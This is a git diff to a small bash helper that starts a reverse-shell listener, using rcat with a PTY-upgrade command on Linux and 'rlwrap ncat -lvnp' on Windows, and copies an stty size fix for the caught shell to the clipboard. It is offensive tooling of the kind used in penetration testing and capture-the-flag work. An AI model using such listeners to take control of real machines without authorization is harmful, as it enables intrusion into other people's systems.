@@ -14,6 +14,11 @@ if [[ "$#" -ne 2 ]]; then
     exit 1
 fi
 
+if ! command -v rcat >/dev/null 2>&1; then
+    echo -e "${RED}[x] rcat not installed"
+    exit 1
+fi
+
 if uname -r | grep -q "microsoft"; then
     copy='/mnt/c/Windows/System32/clip.exe'
 elif [[ "$XDG_SESSION_TYPE" == "x11" ]]; then
@@ -23,15 +28,18 @@ else
 fi
 
 if [[ "$1" == "linux" ]]; then
-    echo -n "stty rows 46 cols 190" | $copy
+    read -r rows cols < <(stty size)
+    echo -n "stty rows $rows cols $cols" | $copy
     echo -e "\n${BLUE}[!]${ENDCOLOR} Fix stty size on the reverse shell"
-    echo -e "${BLUE}[!]${ENDCOLOR} ${YELLOW}stty rows 46 cols 190${ENDCOLOR} copied to clipboard\n"
+    echo -e "${BLUE}[!]${ENDCOLOR} ${YELLOW}stty rows $rows cols $cols${ENDCOLOR} copied to clipboard\n"
 
-    stty raw -echo && rcat listen -ie "/usr/bin/script -qc /bin/bash /dev/null; export TERM=xterm-256color; alias ls='ls --color=auto'; alias grep='grep --color=auto'; alias ip='ip --color=auto'" "$2" && reset
+    stty raw -echo
+    rcat listen -ie "$(command -v script) -qc $(command -v bash) /dev/null; export TERM=xterm-256color; alias ls='ls --color=auto'; alias grep='grep --color=auto'; alias ip='ip --color=auto'" "$2"
+    reset
 elif [[ "$1" == "windows" ]]; then
     echo -ne "\n"
-
     rlwrap ncat -lvnp "$2"
 else
     echo -e "\n${RED}[x]${ENDCOLOR} Invalid option\n"
+    exit 1
 fi
